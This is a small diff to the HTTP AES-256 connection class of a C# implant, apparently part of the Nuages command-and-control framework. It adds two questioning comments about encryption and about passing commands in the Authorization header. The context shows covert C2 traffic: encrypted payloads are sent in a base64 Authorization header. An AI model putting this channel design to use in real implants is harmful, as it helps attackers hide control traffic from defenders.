@@ -23,6 +23,7 @@ namespace NuagesSharpImplant.Connections
 
         public HTTPAES256Connection(string connectionString, string password, int buffersize, int refreshrate)
         {
+            //secondary encryption?
             this.aes = new AESHelper(password);
 
             this.connectionString = connectionString;
@@ -83,7 +84,7 @@ namespace NuagesSharpImplant.Connections
             request.Method = "POST";
 
             UTF8Encoding encoding = new UTF8Encoding();
-
+            //route or command is here in the Auth Header?
             request.Headers.Add("Authorization", Convert.ToBase64String(EncUrl, 0, EncUrl.Length));
             request.ContentLength = byteArray.Length;
             request.ContentType = @"application/x-www-form-urlencoded";
